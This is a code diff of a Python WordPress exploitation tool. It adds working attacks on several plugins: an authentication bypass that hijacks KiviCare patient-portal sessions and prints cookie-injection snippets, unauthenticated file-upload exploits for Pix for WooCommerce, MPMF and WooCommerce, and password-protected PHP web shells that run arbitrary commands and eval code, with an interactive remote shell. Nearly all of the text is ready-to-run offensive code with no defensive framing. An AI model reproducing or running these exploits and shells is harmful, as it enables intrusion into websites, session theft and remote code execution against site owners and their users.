@@ -12,6 +12,7 @@ import urllib3
 import threading
 import zipfile
 import tempfile
+import argparse
 
 RED = "\033[91m"
 GREEN = "\033[92m"
@@ -20,6 +21,8 @@ BLUE = "\033[94m"
 MAGENTA = "\033[95m"
 CYAN = "\033[96m"
 WHITE = "\033[97m"
+PINK = "\033[95m"
+GREY = "\033[90m"
 BOLD = "\033[1m"
 RESET = "\033[0m"
 
@@ -90,6 +93,10 @@ WP_VULN_PLUGINS = [
     {'name': 'ajax-search-pro', 'path': 'wp-content/plugins/ajax-search-pro/js/file_upload.php', 'keywords': ['0', 'error', 'upload']},
     {'name': 'revslider', 'path': 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php', 'keywords': ['revslider', 'update', 'failed']},
     {'name': 'elementor', 'path': 'wp-content/plugins/elementor/core/app/modules/onboarding/module.php', 'keywords': ['elementor_upload_and_install_pro', 'nonce', 'ajax']},
+    {'name': 'woocommerce', 'path': 'wp-admin/admin-ajax.php', 'keywords': ['wc_upload_file_ajax', 'action', 'file']},
+    {'name': 'mpmf', 'path': 'wp-content/plugins/multi-purpose-multi-forms/mpmf-1/', 'keywords': ['mpmf_form_id', 'form_name', 'custom_form_action']},
+    {'name': 'pix-for-woocommerce', 'path': 'wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/', 'keywords': ['lkn_pix_for_woocommerce_generate_nonce', 'nonce']},
+    {'name': 'kivicare', 'path': 'wp-json/kivicare/v1/', 'keywords': ['social-login', 'kivicare', 'auth']},
 ]
 
 # Actual PHP Shell Code
@@ -164,7 +171,15 @@ if(isset($_GET['dir'])) {{
     die;
 }}
 
-// Shell interface
+// System info
+if(isset($_GET['info'])) {{
+    echo "PHP Version: " . phpversion() . "\\n";
+    echo "Server OS: " . PHP_OS . "\\n";
+    echo "User: " . get_current_user() . "\\n";
+    echo "CWD: " . getcwd() . "\\n";
+    die;
+}}
+
 echo "<!DOCTYPE html>
 <html>
 <head>
@@ -219,15 +234,6 @@ echo "<!DOCTYPE html>
             <input type='submit' value='List'>
         </form>
     </div>
-    <div class='section'>
-        <h2>System Info</h2>
-        <pre>
-PHP Version: <?php echo phpversion(); ?>
-Server OS: <?php echo PHP_OS; ?>
-User: <?php echo get_current_user(); ?>
-CWD: <?php echo getcwd(); ?>
-        </pre>
-    </div>
 </body>
 </html>";
 ?>"""
@@ -241,6 +247,17 @@ if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
     if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
 }}
 echo "Aezeron Shell - Password required";
+?>"""
+
+# Simple shell for Pix for WooCommerce
+PIX_SHELL = b"""<?php
+$p = "aezeron";
+if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){
+    if(isset($_REQUEST['cmd'])){ echo shell_exec($_REQUEST['cmd']); die; }
+    if(isset($_FILES['f'])){ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }
+    if(isset($_POST['code'])){ eval($_POST['code']); die; }
+}
+echo "Pix Shell - Password required";
 ?>"""
 
 class WPFileManagerExploit:
@@ -264,7 +281,6 @@ class WPFileManagerExploit:
     def is_shell(self, content):
         if not content:
             return False
-        # Check for our shell first
         if SHELL_PASSWORD in content and ("Aezeron" in content or "system" in content):
             return True
         for pattern in SHELL_REGEX_PATTERNS:
@@ -293,7 +309,6 @@ class WPFileManagerExploit:
             if any(x in content_lower for x in negative_keywords):
                 return False
 
-            # Check for our shell with password
             check_url = f"{url}?p={SHELL_PASSWORD}"
             try:
                 resp_pass = self.session.get(check_url, timeout=5)
@@ -305,7 +320,6 @@ class WPFileManagerExploit:
             except:
                 pass
 
-            # Check for simple shell
             test_cmd_url = f"{url}?p={SHELL_PASSWORD}&cmd=echo%20test"
             try:
                 resp_cmd = self.session.get(test_cmd_url, timeout=5)
@@ -380,28 +394,472 @@ class WPFileManagerExploit:
             pass
         return False, None
     
+    def exploit_kivicare_auth_bypass(self, target_url, email, login_type="google"):
+        """
+        CVE-2026-2991 — KiviCare Clinic & Patient Management System Authentication Bypass
+        Author: Joshua van der Poll
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing KiviCare Auth Bypass (CVE-2026-2991)...")
+        
+        base_url = target_url.rstrip("/")
+        endpoint = "/wp-json/kivicare/v1/auth/patient/social-login"
+        fake_token = "A" * 40  # Fake OAuth token
+        
+        # Check if KiviCare is installed
+        try:
+            check_resp = self.session.get(f"{base_url}/wp-json/kivicare/v1/", timeout=5)
+            if check_resp.status_code >= 500:
+                print(f"    {RED}[-]{RESET} KiviCare plugin not detected or not active")
+                return False, "KiviCare not detected"
+        except:
+            print(f"    {RED}[-]{RESET} Could not detect KiviCare plugin")
+            return False, "KiviCare not detected"
+        
+        print(f"    {CYAN}[*]{RESET} Target email: {email}")
+        print(f"    {CYAN}[*]{RESET} Login type: {login_type}")
+        
+        payload = {
+            "email": email,
+            "login_type": login_type,
+            "password": fake_token,
+        }
+        
+        try:
+            print(f"    {CYAN}[*]{RESET} Sending social login request...")
+            response = self.session.post(
+                f"{base_url}{endpoint}",
+                json=payload,
+                timeout=10,
+                allow_redirects=False,
+            )
+            
+            print(f"    {CYAN}[*]{RESET} HTTP {response.status_code}")
+            
+            if response.status_code == 200:
+                try:
+                    body = response.json()
+                    data = body.get("data", body)
+                    
+                    if "user_id" in data:
+                        print(f"    {GREEN}[+]{RESET} Authentication bypass successful!")
+                        print(f"    {CYAN}[*]{RESET} User ID: {data.get('user_id')}")
+                        print(f"    {CYAN}[*]{RESET} Username: {data.get('username', 'N/A')}")
+                        print(f"    {CYAN}[*]{RESET} Display Name: {data.get('display_name', 'N/A')}")
+                        print(f"    {CYAN}[*]{RESET} Email: {data.get('user_email', 'N/A')}")
+                        print(f"    {CYAN}[*]{RESET} Roles: {', '.join(data.get('roles', []))}")
+                        
+                        # Show cookies
+                        cookies = {c.name: c.value for c in response.cookies}
+                        if cookies:
+                            print(f"    {GREEN}[+]{RESET} Auth cookies obtained!")
+                            for name, value in cookies.items():
+                                print(f"        {YELLOW}{name}{RESET} = {value[:50]}...")
+                            
+                            # Generate console snippet
+                            print(f"\n    {YELLOW}[!]{RESET} Browser console snippet:")
+                            print(f"    {GREY}// Paste in browser console on {base_url}{RESET}")
+                            for name, value in cookies.items():
+                                print(f"    document.cookie = \"{name}={value}; path=/\";")
+                            if data.get("redirect_url"):
+                                print(f"    window.location.href = \"{data['redirect_url']}\";")
+                        
+                        return True, f"KiviCare bypass: Logged in as {data.get('user_email', email)}"
+                    else:
+                        print(f"    {YELLOW}[!]{RESET} No user_id in response")
+                        return False, "No user data returned"
+                        
+                except Exception as e:
+                    print(f"    {RED}[-]{RESET} Error parsing response: {str(e)}")
+                    return False, f"Parse error: {str(e)}"
+                    
+            elif response.status_code == 403:
+                print(f"    {YELLOW}[!]{RESET} 403 Forbidden - Account exists but may not be a patient")
+                cookies = {c.name: c.value for c in response.cookies}
+                if cookies:
+                    print(f"    {GREEN}[+]{RESET} Auth cookies still issued! Session is replayable.")
+                    for name, value in cookies.items():
+                        print(f"        {YELLOW}{name}{RESET} = {value[:50]}...")
+                return True, f"KiviCare partial bypass: Cookies obtained for {email}"
+                
+            elif response.status_code == 400:
+                print(f"    {RED}[-]{RESET} Bad request - Email may not be registered")
+                return False, "Email not registered"
+                
+            else:
+                print(f"    {RED}[-]{RESET} Unexpected response: {response.status_code}")
+                return False, f"HTTP {response.status_code}"
+                
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} KiviCare exploit error: {str(e)}")
+            return False, f"Error: {str(e)}"
+    
+    def exploit_pix_woocommerce_rce(self, target_url, command=None, interactive=False):
+        """
+        CVE-2026-3891 — Pix for WooCommerce <= 1.5.0 - Unauthenticated Arbitrary File Upload
+        Author: Joshua van der Poll
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
+        
+        base_url = target_url.rstrip("/")
+        shell_name = "shell.php"
+        shell_path = f"wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/{shell_name}"
+        shell_url = f"{base_url}/{shell_path}"
+        
+        try:
+            # Step 1: Get nonce
+            print(f"    {CYAN}[*]{RESET} Fetching nonce...")
+            nonce_response = self.session.post(
+                f"{base_url}/wp-admin/admin-ajax.php",
+                data={
+                    "action": "lkn_pix_for_woocommerce_generate_nonce",
+                    "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce",
+                },
+                timeout=10,
+            )
+            
+            try:
+                nonce_data = nonce_response.json()
+                if not nonce_data.get("success"):
+                    print(f"    {RED}[-]{RESET} Nonce request failed: {nonce_data}")
+                    return False, "Failed to get nonce"
+                nonce = nonce_data["data"]["nonce"]
+                print(f"    {GREEN}[+]{RESET} Nonce obtained: {nonce}")
+            except Exception as e:
+                print(f"    {RED}[-]{RESET} Failed to parse nonce response: {str(e)}")
+                return False, f"Nonce error: {str(e)}"
+            
+            # Step 2: Upload shell
+            print(f"    {CYAN}[*]{RESET} Uploading shell...")
+            
+            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
+                tmp.write(PIX_SHELL)
+                tmp_path = tmp.name
+            
+            try:
+                data = {
+                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
+                    "_ajax_nonce": nonce,
+                    "settings": json.dumps({"enabled": "yes", "title": "PIX C6", "pix_expiration_minutes": 30}),
+                }
+                
+                with open(tmp_path, "rb") as f:
+                    files = {
+                        "certificate_crt_path": (shell_name, f, "application/octet-stream"),
+                    }
+                    
+                    upload_response = self.session.post(
+                        f"{base_url}/wp-admin/admin-ajax.php",
+                        data=data,
+                        files=files,
+                        timeout=30,
+                    )
+                
+                try:
+                    upload_data = upload_response.json()
+                    if not upload_data.get("success"):
+                        print(f"    {RED}[-]{RESET} Upload failed: {upload_data}")
+                        return False, "Upload failed"
+                except:
+                    pass
+                
+                print(f"    {GREEN}[+]{RESET} Shell uploaded successfully!")
+                print(f"    {CYAN}[*]{RESET} Shell URL: {shell_url}")
+                print(f"    {YELLOW}[!]{RESET} Password: {SHELL_PASSWORD}")
+                
+            finally:
+                os.unlink(tmp_path)
+            
+            # Step 3: Verify shell
+            print(f"    {CYAN}[*]{RESET} Verifying shell...")
+            verify_response = self.session.get(shell_url, timeout=10)
+            
+            if verify_response.status_code == 200:
+                print(f"    {GREEN}[+]{RESET} Shell is accessible!")
+                
+                test_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd=echo%20test")
+                if test_response.status_code == 200 and "test" in test_response.text:
+                    print(f"    {GREEN}[SHELL]{RESET} Pix shell active: {shell_url}?p={SHELL_PASSWORD}")
+                    
+                    if command:
+                        print(f"    {CYAN}[*]{RESET} Running command: {command}")
+                        cmd_response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={command}", timeout=10)
+                        if cmd_response.status_code == 200 and cmd_response.text.strip():
+                            print(f"\n    {GREEN}[OUTPUT]{RESET}\n{cmd_response.text.strip()}\n")
+                    
+                    if interactive:
+                        self.interactive_pix_shell(shell_url)
+                    
+                    return True, f"Pix Shell: {shell_url}?p={SHELL_PASSWORD}"
+                else:
+                    print(f"    {YELLOW}[!]{RESET} Shell uploaded but command execution failed")
+                    return True, f"Pix payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
+            else:
+                print(f"    {RED}[-]{RESET} Shell not accessible (HTTP {verify_response.status_code})")
+                return False, "Shell upload failed verification"
+                
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Pix exploit error: {str(e)}")
+            return False, f"Error: {str(e)}"
+    
+    def interactive_pix_shell(self, shell_url):
+        """Interactive shell for Pix for WooCommerce"""
+        print(f"\n  {GREEN}[+]{RESET} Entering interactive shell mode...")
+        print(f"  {YELLOW}[!]{RESET} Type 'exit' or Ctrl+C to quit\n")
+        
+        try:
+            while True:
+                cmd = input(f"  {PINK}shell>{RESET} ").strip()
+                if not cmd:
+                    continue
+                if cmd.lower() in ('exit', 'quit'):
+                    break
+                
+                try:
+                    response = self.session.get(f"{shell_url}?p={SHELL_PASSWORD}&cmd={cmd}", timeout=10)
+                    if response.status_code == 200 and response.text.strip():
+                        print(response.text.strip())
+                    else:
+                        print(f"  {YELLOW}[!]{RESET} No output or command failed")
+                except Exception as e:
+                    print(f"  {RED}[-]{RESET} Error: {str(e)}")
+        except KeyboardInterrupt:
+            print(f"\n  {YELLOW}[!]{RESET} Exiting interactive shell")
+    
+    def exploit_mpmf_rce(self, target_url, form_name=None):
+        """
+        CVE-2024-50526: Multi-Purpose Multi-Forms (mpmf) Unauthenticated RCE
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
+        
+        if not target_url.endswith('/'):
+            target_url += '/'
+        
+        base_parts = target_url.split('/wp-content/')
+        if len(base_parts) > 1:
+            base_url = base_parts[0] + '/'
+        else:
+            base_url = target_url
+        
+        if not form_name:
+            print(f"    {CYAN}[*]{RESET} No form name provided, attempting to detect...")
+            try:
+                response = self.session.get(target_url, timeout=10)
+                form_patterns = [
+                    r'name="form_name"\s+value="([^"]+)"',
+                    r'form_name["\']\s*:\s*["\']([^"\']+)',
+                    r'form_id["\']\s*:\s*["\']([^"\']+)',
+                ]
+                for pattern in form_patterns:
+                    match = re.search(pattern, response.text)
+                    if match:
+                        form_name = match.group(1)
+                        print(f"    {GREEN}[+]{RESET} Detected form_name: {form_name}")
+                        break
+                if not form_name:
+                    common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload']
+                    for fname in common_forms:
+                        test_url = f"{base_url}?form_name={fname}"
+                        test_resp = self.session.get(test_url, timeout=5)
+                        if test_resp.status_code == 200 and 'mpmf' in test_resp.text.lower():
+                            form_name = fname
+                            print(f"    {GREEN}[+]{RESET} Found working form: {form_name}")
+                            break
+            except:
+                pass
+        
+        if not form_name:
+            print(f"    {RED}[-]{RESET} Could not detect form_name")
+            return False, "Form name not detected"
+        
+        if '/mpmf-' in target_url:
+            endpoint_url = target_url
+        else:
+            endpoint_url = urljoin(base_url, 'mpmf-1/')
+        
+        php_payload = f"""<?php
+$p = "{SHELL_PASSWORD}";
+if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
+    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
+    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
+    if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
+}}
+if (php_sapi_name() !== 'cli' && !isset($_GET['cmd'])) {{
+    echo 'System OS: ' . php_uname('s');
+}}
+if (isset($_GET['cmd'])) {{
+    system($_GET['cmd']);
+}}
+?>"""
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Origin": base_url.rstrip('/'),
+            "DNT": "1",
+            "Sec-GPC": "1",
+            "Connection": "keep-alive",
+            "Referer": endpoint_url,
+            "Upgrade-Insecure-Requests": "1",
+        }
+        
+        files = {
+            "file1": ("cmd.php", php_payload, "application/octet-stream"),
+        }
+        
+        data = {
+            "form_name": form_name,
+            "field_label1": "",
+            "countcalculated": "1",
+            "count_files": "1",
+            "count": "2",
+            "mpmf_form_id": "1",
+            "custom_form_action": "send_data",
+            "send": "Submit",
+        }
+        
+        try:
+            print(f"    {CYAN}[*]{RESET} Uploading payload to {endpoint_url}")
+            response = self.session.post(endpoint_url, headers=headers, files=files, data=data, timeout=30)
+            
+            if response.status_code == 200:
+                print(f"    {GREEN}[+]{RESET} File upload successful!")
+                
+                shell_url = f"{base_url}wp-content/uploads/mpmf_uploads/cmd.php"
+                print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
+                
+                time.sleep(2)
+                
+                if self.verify_shell(shell_url):
+                    print(f"    {GREEN}[SHELL]{RESET} MPMF shell active: {shell_url}?p={SHELL_PASSWORD}")
+                    return True, f"MPMF Shell: {shell_url}?p={SHELL_PASSWORD}"
+                else:
+                    alt_paths = [
+                        f"{base_url}wp-content/uploads/cmd.php",
+                        f"{base_url}wp-content/uploads/mpmf/cmd.php",
+                        f"{base_url}uploads/mpmf_uploads/cmd.php",
+                    ]
+                    for alt_url in alt_paths:
+                        if self.verify_shell(alt_url):
+                            print(f"    {GREEN}[SHELL]{RESET} MPMF shell found: {alt_url}?p={SHELL_PASSWORD}")
+                            return True, f"MPMF Shell: {alt_url}?p={SHELL_PASSWORD}"
+                    
+                    print(f"    {YELLOW}[!]{RESET} Payload uploaded but shell verification failed")
+                    return True, f"MPMF payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
+            else:
+                print(f"    {RED}[-]{RESET} Upload failed with status {response.status_code}")
+                return False, f"Upload failed with status {response.status_code}"
+                
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} MPMF exploit error: {str(e)}")
+            return False, f"Error: {str(e)}"
+    
+    def exploit_woocommerce_rce(self, target_url):
+        """
+        CVE-2024-51793: WooCommerce Unauthenticated RCE via admin-ajax.php
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing WooCommerce RCE (CVE-2024-51793)...")
+        
+        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
+        shell_name = f"woo_{random.randint(1000, 9999)}.php"
+        
+        php_payload = f"""<?php
+$p = "{SHELL_PASSWORD}";
+if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
+    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
+    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
+    if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
+}}
+if (php_sapi_name() !== 'cli' && !isset($_GET['cmd'])) {{
+    echo 'System OS: ' . php_uname('s');
+}}
+if (isset($_GET['cmd'])) {{
+    system($_GET['cmd']);
+}}
+?>"""
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Referer": f"{target_url}/wp-admin/post.php?post=373&action=edit",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": target_url,
+            "DNT": "1",
+            "Sec-GPC": "1",
+            "Connection": "keep-alive",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+        }
+        
+        files = {
+            "file": (shell_name, php_payload, "image/jpeg"),
+        }
+        
+        data = {
+            "action": "wc_upload_file_ajax",
+        }
+        
+        try:
+            print(f"    {CYAN}[*]{RESET} Uploading payload to {ajax_url}")
+            response = self.session.post(ajax_url, headers=headers, files=files, data=data, timeout=30)
+            
+            if response.status_code == 200:
+                print(f"    {GREEN}[+]{RESET} Request successful!")
+                
+                response_text = response.text.replace(r"\/", "/")
+                
+                url_patterns = [
+                    r'http[s]?://[^\s"\'<>]+\.php',
+                    r'https?://[^\s"\'<>]+\.php',
+                    r'/[^\s"\'<>]+\.php'
+                ]
+                
+                uploaded_url = None
+                for pattern in url_patterns:
+                    match = re.search(pattern, response_text)
+                    if match:
+                        uploaded_url = match.group(0)
+                        if not uploaded_url.startswith('http'):
+                            uploaded_url = urljoin(target_url, uploaded_url)
+                        break
+                
+                if uploaded_url:
+                    print(f"    {GREEN}[+]{RESET} Payload uploaded: {uploaded_url}")
+                    
+                    if self.verify_shell(uploaded_url):
+                        print(f"    {GREEN}[SHELL]{RESET} WooCommerce shell active: {uploaded_url}?p={SHELL_PASSWORD}")
+                        return True, f"WooCommerce Shell: {uploaded_url}?p={SHELL_PASSWORD}"
+                    else:
+                        print(f"    {YELLOW}[!]{RESET} Shell uploaded but verification failed")
+                        return True, f"WooCommerce payload uploaded: {uploaded_url}?p={SHELL_PASSWORD}"
+                else:
+                    print(f"    {YELLOW}[!]{RESET} Could not extract file URL from response")
+                    return False, "Failed to extract file URL"
+            else:
+                print(f"    {RED}[-]{RESET} Request failed with status {response.status_code}")
+                return False, f"Upload failed with status {response.status_code}"
+                
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} WooCommerce exploit error: {str(e)}")
+            return False, f"Error: {str(e)}"
+    
     def create_elementor_payload_zip(self, shell_content=None, zip_name=None):
-        """
-        Create a ZIP file with the correct structure for Elementor exploit
-        Structure: elementor-pro/elementor-pro.php
-        """
         if zip_name is None:
             zip_name = tempfile.mktemp(suffix='.zip')
         
         if shell_content is None:
             shell_content = SIMPLE_SHELL
         
-        # Create the ZIP with correct structure
         with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            # Add elementor-pro.php inside elementor-pro folder
             zipf.writestr('elementor-pro/elementor-pro.php', shell_content)
         
         return zip_name
     
     def elementor_login(self, target_url, username, password):
-        """
-        Login to WordPress to get nonce for Elementor exploit
-        """
         print(f"    {CYAN}[*]{RESET} Attempting to login as: {username}")
         
         login_url = urljoin(target_url, 'wp-login.php')
@@ -418,8 +876,6 @@ class WPFileManagerExploit:
         try:
             response = self.session.post(login_url, data=data, timeout=10)
             
-            # Search for nonce in the response
-            # Pattern: "ajax":{"url":"http:\/\/baseUrl\/wp-admin\/admin-ajax.php","nonce":"4e8878bdba"}
             nonce_pattern = re.compile(r'"ajax":\{"url":".+admin-ajax\.php","nonce":"([^"]+)"\}')
             search = nonce_pattern.search(response.text)
             
@@ -437,14 +893,8 @@ class WPFileManagerExploit:
             return None
     
     def exploit_elementor(self, target_url, username, password, auto_shell=True):
-        """
-        CVE-2022-1329: Elementor 3.6.0/1/2 Remote Code Execution
-        Exploit by AkuCyberSec
-        Uploads actual PHP shell directly
-        """
         print(f"\n  {CYAN}[*]{RESET} Testing Elementor RCE (CVE-2022-1329)...")
         
-        # Check if Elementor is installed
         elementor_path = urljoin(target_url, 'wp-content/plugins/elementor/readme.txt')
         try:
             check = self.session.get(elementor_path, timeout=5)
@@ -455,7 +905,6 @@ class WPFileManagerExploit:
             print(f"    {YELLOW}[!]{RESET} Elementor plugin not detected")
             return False, "Elementor not installed"
         
-        # Login to get nonce
         nonce = self.elementor_login(target_url, username, password)
         if not nonce:
             return False, "Login failed - cannot proceed with Elementor exploit"
@@ -463,12 +912,10 @@ class WPFileManagerExploit:
         if not auto_shell:
             return True, f"Elementor vulnerable, nonce obtained: {nonce}"
         
-        # Create payload zip with actual PHP shell
-        print(f"    {CYAN}[*]{RESET} Creating Elementor payload ZIP with actual shell...")
+        print(f"    {CYAN}[*]{RESET} Creating Elementor payload ZIP...")
         zip_path = self.create_elementor_payload_zip(ACTUAL_PHP_SHELL)
         
         try:
-            # Upload the payload
             upload_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
             data = {
                 'action': 'elementor_upload_and_install_pro',
@@ -481,29 +928,22 @@ class WPFileManagerExploit:
             print(f"    {CYAN}[*]{RESET} Uploading payload...")
             response = self.session.post(upload_url, data=data, files=files, timeout=30)
             
-            # Clean up temp file
             os.remove(zip_path)
             
-            # Check if upload was successful
             if '"elementorProInstalled":true' in response.text:
                 print(f"    {GREEN}[+]{RESET} Payload uploaded successfully!")
                 
-                # The shell is now activated as a plugin
-                # Check if our shell is accessible
                 shell_url = urljoin(target_url, 'wp-content/plugins/elementor-pro/elementor-pro.php')
-                
-                time.sleep(2)  # Wait for activation
+                time.sleep(2)
                 
                 if self.verify_shell(shell_url):
                     print(f"    {GREEN}[SHELL]{RESET} Elementor shell active: {shell_url}?p={SHELL_PASSWORD}")
                     return True, f"Elementor Shell: {shell_url}?p={SHELL_PASSWORD}"
                 else:
                     print(f"    {YELLOW}[!]{RESET} Payload uploaded but shell verification failed")
-                    print(f"    {YELLOW}[!]{RESET} Try accessing: {shell_url}?p={SHELL_PASSWORD}")
-                    return True, f"Elementor payload uploaded (verify manually): {shell_url}?p={SHELL_PASSWORD}"
+                    return True, f"Elementor payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
             else:
                 print(f"    {RED}[-]{RESET} Upload failed")
-                print(f"    {YELLOW}[!]{RESET} Response: {response.text[:200]}")
                 return False, "Elementor upload failed"
                 
         except Exception as e:
@@ -512,20 +952,14 @@ class WPFileManagerExploit:
             print(f"    {RED}[-]{RESET} Elementor exploit error: {str(e)}")
             return False, f"Error: {str(e)}"
     
-    def exploit_admin_ajax_rce(self, target_url, nonce=None, cookies=None):
-        """
-        Exploit for admin-ajax.php RCE via saveMappedFields action
-        Uploads actual PHP shell directly
-        """
+    def exploit_admin_ajax_rce(self, target_url, nonce=None):
         print(f"\n  {CYAN}[*]{RESET} Testing admin-ajax.php RCE exploit...")
         
         ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
         shell_name = f"Aezeron_{random.randint(1000, 9999)}.php"
         
-        # Use actual PHP shell as the payload (no file_put_contents wrapper)
         php_payload = ACTUAL_PHP_SHELL
         
-        # MappedFields JSON structure with actual shell code
         mapped_fields = {
             "pwn->cus2": php_payload
         }
@@ -536,10 +970,6 @@ class WPFileManagerExploit:
             'MappedFields': json.dumps(mapped_fields)
         }
         
-        # Set cookies if provided
-        if cookies:
-            self.session.cookies.update(cookies)
-        
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded',
             'X-Requested-With': 'XMLHttpRequest',
@@ -548,115 +978,33 @@ class WPFileManagerExploit:
         
         try:
             print(f"    {CYAN}[*]{RESET} Sending exploit payload to {ajax_url}")
-            
             response = self.session.post(ajax_url, data=data, headers=headers, timeout=10)
             
             if response.status_code == 200:
-                print(f"    {GREEN}[+]{RESET} Request successful (Status: {response.status_code})")
+                print(f"    {GREEN}[+]{RESET} Request successful")
                 
-                # The shell should be written directly to the webroot
-                # Try multiple possible locations
                 possible_paths = [
                     urljoin(target_url, shell_name),
                     urljoin(target_url, f'wp-content/{shell_name}'),
                     urljoin(target_url, f'wp-content/uploads/{shell_name}'),
-                    urljoin(target_url, f'wp-admin/{shell_name}'),
                 ]
                 
                 for shell_url in possible_paths:
-                    print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
                     time.sleep(1)
-                    
                     if self.verify_shell(shell_url):
-                        print(f"    {GREEN}[SHELL]{RESET} Shell successfully created: {shell_url}?p={SHELL_PASSWORD}")
-                        return True, f"admin-ajax RCE Shell: {shell_url}?p={SHELL_PASSWORD}"
+                        print(f"    {GREEN}[SHELL]{RESET} Shell created: {shell_url}?p={SHELL_PASSWORD}")
+                        return True, f"admin-ajax Shell: {shell_url}?p={SHELL_PASSWORD}"
                 
-                print(f"    {YELLOW}[!]{RESET} Shell not found in common locations")
-                print(f"    {YELLOW}[!]{RESET} Response preview: {response.text[:200]}")
                 return False, "Shell created but verification failed"
             else:
-                print(f"    {RED}[-]{RESET} Request failed (Status: {response.status_code})")
+                print(f"    {RED}[-]{RESET} Request failed")
                 return False, f"Request failed with status {response.status_code}"
                 
         except Exception as e:
             print(f"    {RED}[-]{RESET} Error: {str(e)}")
             return False, f"Error: {str(e)}"
     
-    def brute_force_admin_ajax_nonce(self, target_url):
-        """
-        Attempt to brute force or find the nonce for admin-ajax.php
-        """
-        print(f"    {CYAN}[*]{RESET} Attempting to find valid nonce...")
-        
-        # Common nonce patterns
-        nonce_patterns = [
-            r'ajax_nonce["\']\s*:\s*["\']([^"\']+)',
-            r'_wpnonce["\']\s*:\s*["\']([^"\']+)',
-            r'nonce["\']\s*:\s*["\']([^"\']+)',
-            r'security["\']\s*:\s*["\']([^"\']+)',
-            r'ajaxnonce["\']\s*:\s*["\']([^"\']+)'
-        ]
-        
-        try:
-            # Check admin-ajax page for nonce
-            ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
-            response = self.session.get(ajax_url, timeout=5)
-            
-            # Look for nonce in response
-            for pattern in nonce_patterns:
-                match = re.search(pattern, response.text, re.IGNORECASE)
-                if match:
-                    nonce = match.group(1)
-                    print(f"    {GREEN}[+]{RESET} Found potential nonce: {nonce}")
-                    return nonce
-            
-            # Check admin page
-            admin_url = urljoin(target_url, 'wp-admin/admin.php')
-            response = self.session.get(admin_url, timeout=5)
-            for pattern in nonce_patterns:
-                match = re.search(pattern, response.text, re.IGNORECASE)
-                if match:
-                    nonce = match.group(1)
-                    print(f"    {GREEN}[+]{RESET} Found nonce in admin page: {nonce}")
-                    return nonce
-            
-            print(f"    {YELLOW}[!]{RESET} Could not find nonce, will try without it")
-            return None
-            
-        except Exception as e:
-            print(f"    {YELLOW}[!]{RESET} Error finding nonce: {str(e)}")
-            return None
-    
-    def exploit_admin_ajax_auto(self, target_url):
-        """
-        Auto exploit admin-ajax.php - tries to find nonce and execute
-        """
-        print(f"\n  {CYAN}[*]{RESET} Testing admin-ajax.php auto-exploit...")
-        
-        # Try to get cookies first (visit site)
-        try:
-            self.session.get(target_url, timeout=5)
-            print(f"    {GREEN}[+]{RESET} Session established")
-        except:
-            pass
-        
-        # Try to find nonce
-        nonce = self.brute_force_admin_ajax_nonce(target_url)
-        
-        # Try exploit with found nonce
-        success, msg = self.exploit_admin_ajax_rce(target_url, nonce)
-        
-        if success:
-            return success, msg
-        
-        # Try without nonce (some plugins don't check)
-        print(f"    {CYAN}[*]{RESET} Trying without nonce...")
-        success, msg = self.exploit_admin_ajax_rce(target_url, None)
-        
-        return success, msg
-    
     def check_version_cve_2020_25213(self, target_url):
-        """Check wp-file-manager version for CVE-2020-25213"""
         readme_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/readme.txt')
         
         try:
